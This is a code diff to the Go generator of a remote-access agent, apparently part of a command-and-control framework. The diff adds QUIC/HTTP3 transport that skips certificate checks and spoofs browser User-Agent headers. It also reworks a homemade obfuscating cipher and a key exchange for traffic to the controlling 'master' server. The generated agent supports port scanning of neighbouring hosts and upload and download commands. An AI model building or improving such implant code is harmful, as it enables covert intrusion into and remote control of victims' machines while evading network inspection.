@@ -10,11 +10,16 @@ func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
     if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || code == "" || base_rounds == "" {
         return "parameter null"
     }
-    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func string
+    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func,inithttp,prototime,protocol_var,protocol_var1,header string
 	if protocol == "https" {
-		protocol_str = "TLSClientConfig: &tls.Config{InsecureSkipVerify: true,},"
 		tls_str = `"crypto/tls"`
-	} else {
+	}else if protocol == "quic"{
+        tls_str = `
+            "crypto/tls"
+            "github.com/quic-go/quic-go"
+            "github.com/quic-go/quic-go/http3"
+        `
+    }else {
 		tls_str = ""
 	}
 	if os == "win" {
@@ -433,7 +438,97 @@ func send() { //发送头部信息
                     case "GET_PORTS":
                         go scan_u_firends(shell, msg[2], msg[3], "port")`
     }
-	protocol_var :="\""+protocol + "://\""
+    if protocol == "quic"{
+        inithttp = `
+        func initHttpClient() {
+            transport = &http3.Transport{
+                TLSClientConfig: &tls.Config{
+                    InsecureSkipVerify: true,
+                    MinVersion:tls.VersionTLS13,
+                },
+                QUICConfig: &quic.Config{
+                    MaxIdleTimeout: 0,
+                },
+            }
+            client = &http.Client{
+                Transport: transport,
+                Timeout:   30 * time.Second,
+            }
+        }
+        `
+        protocol_var1 = "transport *http3.Transport"
+    }else if protocol == "http"{
+        inithttp = `
+        func initHttpClient() {
+            transport = &http.Transport{
+                MaxConnsPerHost:     1,
+                MaxIdleConns:        1,
+                MaxIdleConnsPerHost: 1,
+                DisableKeepAlives:   false,
+                DialContext: (&net.Dialer{
+                    Timeout:   30 * time.Second,
+                    KeepAlive: 30 * time.Second,
+                }).DialContext,
+            }
+            client = &http.Client{
+                Transport: transport,
+                Timeout:   30 * time.Second,
+            }
+        }
+        `
+        protocol_var1 = "transport *http.Transport"
+    }else if protocol == "https"{
+        inithttp = `
+        func initHttpClient() {
+            transport = &http.Transport{
+                MaxConnsPerHost:     1,
+                MaxIdleConns:        1,
+                MaxIdleConnsPerHost: 1,
+                DisableKeepAlives:   false,
+                DialContext: (&net.Dialer{
+                    Timeout:   30 * time.Second,
+                    KeepAlive: 30 * time.Second,
+                }).DialContext,
+                TLSClientConfig: &tls.Config{InsecureSkipVerify: true,},
+            }
+            client = &http.Client{
+                Transport: transport,
+                Timeout:   30 * time.Second,
+            }
+        }
+        `
+        protocol_var1 = "transport *http.Transport"
+    }
+    if protocol == "quic"{
+        prototime= `
+        if transport != nil && transport.QUICConfig != nil {
+            if delay >= 30 {
+                transport.QUICConfig.MaxIdleTimeout = 5 * time.Second
+            } else {
+                transport.QUICConfig.MaxIdleTimeout = 0
+            }
+        }`
+    }else{
+        prototime= `
+        if delay >= 30 {
+            transport.IdleConnTimeout = 5 * time.Second
+        } else {
+            transport.IdleConnTimeout = 0
+        }`
+    }
+    if protocol == "quic" {
+        protocol_var = "\"https://\""
+        header = `
+        get_headers map[string]string = map[string]string{"Accept": "text/html,application/xhtml+xml","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
+        post_headers map[string]string = map[string]string{"Content-Type": "application/json","Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",}
+        `
+    }else{
+        protocol_var = "\""+protocol + "://\""
+        header = `
+        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
+        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
+        `
+    }
     s_server := "\""+server+"\""
     u_username := "\""+Username+"\""
     o_os := "\""+os+"\""
@@ -455,8 +550,10 @@ func send() { //发送头部信息
         "strconv"
         "sync"
         "path/filepath"
+        "math/bits"
         /*sys_str*/
         /*tls_str*/
+        /*http3*/
     )
     var(
         osname = /*os*/
@@ -475,29 +572,12 @@ func send() { //发送头部信息
         user string = /*Username*/
         master string = /*server*/
         key string
-        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
-        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
-        transport http.RoundTripper
+        /*header*/
+        /*protocol_var1*/
         client *http.Client
     )
     /*main_str*/
-    func initHttpClient() {
-        transport = &http.Transport{
-	        MaxConnsPerHost:     1,
-			MaxIdleConns:        1,
-			MaxIdleConnsPerHost: 1,
-			DisableKeepAlives:   false,
-            DialContext: (&net.Dialer{
-                Timeout:   30 * time.Second,
-                KeepAlive: 30 * time.Second,
-            }).DialContext,
-            /*protocol_str*/
-        }
-        client = &http.Client{
-            Transport: transport,
-            Timeout:   30 * time.Second,
-        }
-    }
+    /*inithttp*/
     func getUrl(url string) string {
         for {
             req, err := http.NewRequest("GET", url, nil)
@@ -555,7 +635,7 @@ func send() { //发送头部信息
                 continue
             }
             resp.Body.Close()
-            return // 成功
+            return
         }
     }
     func urlEncode(s string) string {
@@ -814,13 +894,7 @@ func send() { //发送头部信息
         delayMutex.Lock()
         defer delayMutex.Unlock()
         delay = int(parsedTime)
-        if t, ok := transport.(*http.Transport); ok {
-            if delay >= 30 {
-                t.IdleConnTimeout = 5 * time.Second
-            } else {
-                t.IdleConnTimeout = 0
-            }
-        }
+        /*prototime*/
         return
     }
     /*scan_str*/
@@ -848,57 +922,69 @@ func send() { //发送头部信息
         return strings.Join(ips, ",")
     }
     /*send*/
-    // obf const encry
     type ObfConst struct {
-        A byte // 0x6b
-        B byte // 0x7a
-        C byte // 0x5c
-        D byte // 0xe4
-        E byte // 0x3f
-        F byte // 0xa5
+        A byte
+        B byte
+        C byte
+        D byte
+        E byte
+        F byte
+    }
+    func updateABC(A, B, C, x, y, z byte) (byte, byte, byte) {
+        v := uint32(A)<<24 | uint32(B)<<16 | uint32(C)<<8 | uint32(x)
+        v += uint32(y)<<8 | uint32(z)
+        v = bits.RotateLeft32(v, 7)
+        v ^= uint32(C)<<24 | uint32(A)<<16
+        return byte(v >> 24), byte(v >> 16),byte(v >> 8)
+    }
+    func updateDEF(D, E, F, x, y, z byte) (byte, byte, byte) {
+        v := uint32(D)<<24 | uint32(E)<<16 | uint32(F)<<8 | uint32(x)
+        v += uint32(y)<<8 | uint32(z)
+        v = bits.RotateLeft32(v, 11)
+        v ^= uint32(F)<<24 | uint32(D)<<16
+        return byte(v >> 24), byte(v >> 16),byte(v >> 8)
     }
     func ObfuscateBySteps(data []byte, k ObfConst) []byte {
-		if len(data) < 3 {
-			return data
-		}
-		n := len(data) / 3
-		remainder := len(data) % 3
-		if n < 2 {
-			data[0] ^= k.A
-			data[1] ^= k.B
-			data[2] ^= k.C
-			for i := 3; i < len(data); i++ {
-				data[i] ^= k.A ^ k.B ^ k.C
-			}
-			return data
-		}
-		at := func(r, c int) *byte {
-			return &data[r*n+c]
-		}
-		for col := 1; col < n; col++ {
-			colIndex := col + 1
-			if colIndex%2 == 0 {
-				*at(0, col) = (*at(0, col-1) | *at(0, col)) ^ k.A
-				*at(2, col) = *at(1, col-1) ^ *at(2, col) ^ k.B
-				*at(1, col) = *at(2, col-1) ^ *at(1, col) ^ k.C
-			} else {
-				*at(1, col) = (*at(0, col-1) ^ *at(1, col)) ^ k.D
-				*at(0, col) = *at(1, col-1) ^ (*at(0, col) ^ k.E)
-				*at(2, col) = (*at(2, col-1) | *at(2, col)) ^ k.F
-			}
-		}
-		lastCol := n - 1
-		*at(0, 0) = (*at(0, lastCol) | *at(0, 0)) ^ k.A
-		*at(2, 0) = *at(1, lastCol) ^ *at(2, 0) ^ k.B
-		*at(1, 0) = *at(2, lastCol) ^ *at(1, 0) ^ k.C
-		if remainder > 0 {
-			start := 3 * n
-			for i := start; i < len(data); i++ {
-				data[i] ^= data[i-1] ^ k.A ^ k.B
-			}
-		}
-		return data
-	}
+        if len(data)==0 {
+            return data
+        }
+        if len(data)<3 {
+            for i:=range data {
+                data[i] ^= k.A ^ k.B | k.C
+            }
+            return data
+        }
+        n := len(data) / 3
+        remainder := len(data) % 3
+        at := func(r, c int) *byte {
+            return &data[r*n+c]
+        }
+        prev0 := k.A
+        prev1 := k.B
+        prev2 := k.C
+        for col := 0; col < n; col++ {
+            colIndex := col + 1
+            if colIndex%2 == 0 {
+                *at(0,col) = (*at(0,col) | prev0) ^ k.A
+                *at(2,col) = prev1 ^ *at(2,col) ^ k.B
+                *at(1,col) = prev2 ^ *at(1,col) | k.C
+                prev0 = *at(0,col)
+                prev1 = *at(1,col)
+                prev2 = *at(2,col)
+                k.A,k.B,k.C = updateABC(k.A,k.B,k.C,prev0,prev1,prev2)
+            } else {
+                *at(1,col) = (prev0 ^ *at(1,col)) | k.D
+                *at(0,col) = prev1 ^ (*at(0,col) ^ k.E)
+                *at(2,col) = (*at(2,col) | prev2) ^ k.F
+                prev0 = *at(0,col)
+                prev1 = *at(1,col)
+                prev2 = *at(2,col)
+                k.D,k.E,k.F = updateDEF(k.D,k.E,k.F,prev0,prev1,prev2)
+            }
+        }
+        if remainder > 0 { start := 3*n;for i:=start; i<len(data); i++ { data[i] ^= data[i-1] ^ k.A | k.B } }
+        return data
+    }
     func randomSalt6() (ObfConst, []byte) {
         var s [6]byte
         _, _ = rand.Read(s[:])
@@ -912,45 +998,53 @@ func send() { //发送头部信息
         }, s[:]
     }
     func Encrypt(plain []byte) []byte {
-        if len(plain) == 0 {
+        if len(plain) == 0 || len(key) == 0 {
             return nil
         }
         obfKey, salt := randomSalt6()
-        sin := (int(key[1024%len(key)])*len(plain) ^ 1024) % len(key)
-        ofkey := append([]byte{}, key[sin:]...)
+        sin := (int(key[1024%len(key)])*len(plain)^1024)%len(key)
+        ofkeyLen := len(key)-sin
+        if ofkeyLen > len(plain) {
+            ofkeyLen = len(plain)
+        }
+        ofkey := append([]byte{}, key[sin:sin+ofkeyLen]...)
         fuscateKey := ObfuscateBySteps(ofkey, obfKey)
-        if len(fuscateKey) == 0 {
+        if len(fuscateKey)==0 {
             return nil
         }
-        out := make([]byte, len(plain))
-        for i := range plain {
-            out[i] = plain[i] ^ fuscateKey[i%len(fuscateKey)]
+        out:=make([]byte,len(plain))
+        for i:=range plain {
+            out[i]=plain[i]^fuscateKey[i%len(fuscateKey)]
         }
-        return append(out, salt...)
+        return append(out,salt...)
     }
-    func Decrypt(cipher  []byte) []byte {
-        if len(cipher) < 6 {
+    func Decrypt(cipher []byte) []byte {
+        if len(cipher)<6 || len(key)==0 {
             return nil
         }
-        data := cipher[:len(cipher)-6]
-        salt := cipher[len(cipher)-6:]
-        obfKey := ObfConst{
-            A: salt[0],
-            B: salt[1],
-            C: salt[2],
-            D: salt[3],
-            E: salt[4],
-            F: salt[5],
+        data:=cipher[:len(cipher)-6]
+        salt:=cipher[len(cipher)-6:]
+        obfKey:=ObfConst{
+            A:salt[0],
+            B:salt[1],
+            C:salt[2],
+            D:salt[3],
+            E:salt[4],
+            F:salt[5],
         }
-        sin := (int(key[1024%len(key)])*len(data) ^ 1024) % len(key)
-        ofkey := append([]byte{}, key[sin:]...)
-        fuscateKey := ObfuscateBySteps(ofkey, obfKey)
-        if len(fuscateKey) == 0 {
+        sin:=(int(key[1024%len(key)])*len(data)^1024)%len(key)
+        ofkeyLen:=len(key)-sin
+        if ofkeyLen>len(data){
+            ofkeyLen=len(data)
+        }
+        ofkey:=append([]byte{},key[sin:sin+ofkeyLen]...)
+        fuscateKey:=ObfuscateBySteps(ofkey,obfKey)
+        if len(fuscateKey)==0{
             return nil
         }
-        out := make([]byte, len(data))
-        for i := range data {
-            out[i] = data[i] ^ fuscateKey[i%len(fuscateKey)]
+        out:=make([]byte,len(data))
+        for i:=range data{
+            out[i]=data[i]^fuscateKey[i%len(fuscateKey)]
         }
         return out
     }
@@ -1115,7 +1209,7 @@ func send() { //发送头部信息
     }
     func deriveP(raw string) *big.Int {
         hexStr := onlyHex(raw)
-        pStr := "FFFFFFFFFFFF" + hexStr
+        pStr := "FFFFFFFFFFFFFFF" + hexStr
         p, ok := new(big.Int).SetString(pStr, 16)
         if !ok {
             return nil
@@ -1137,13 +1231,6 @@ func send() { //发送头部信息
         }
         return g
     }
-	func leftPad(b []byte, minLen int) []byte {
-		if len(b) >= minLen {
-			return b
-		}
-		pad := make([]byte, minLen-len(b))
-		return append(pad, b...)
-	}
 	func generateAndUpdateKey(url string) []byte {
 		p := deriveP(base_rounds)
 		if p == nil {
@@ -1158,13 +1245,12 @@ func send() { //发送头部信息
 			return nil
 		}
 		A := new(big.Int).SetBytes(decodedBytes)
-		secret := new(big.Int).Exp(A, b, p)
-		secretBytes := leftPad(secret.Bytes(), 12)
+		secyret := new(big.Int).Exp(A, b, p)
 		BBytes := B.Bytes()
 		BBase64 := customBase64Encode(BBytes)
 		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + BBase64
 		getUrl(key_url)
-		return secretBytes
+		return secyret.Bytes()
 	}
     func getConn(newKey_map *[]byte) {
         key = "null"
@@ -1251,6 +1337,10 @@ func send() { //发送头部信息
         `/\*send\*/`:             send,
         `/\*scan_str\*/`:         scan_str,
         `/\*scan_func\*/`:        scan_func,
+        `/\*inithttp\*/`:         inithttp,   
+        `/\*prototime\*/`:         prototime,
+        `/\*protocol_var1\*/`:    protocol_var1,
+        `/\*header\*/`:           header,
 	}
     //先将code中的关键词进行替换
 	processedCode := replacePlaceholders(code, replacements, `/\*code\*/`)
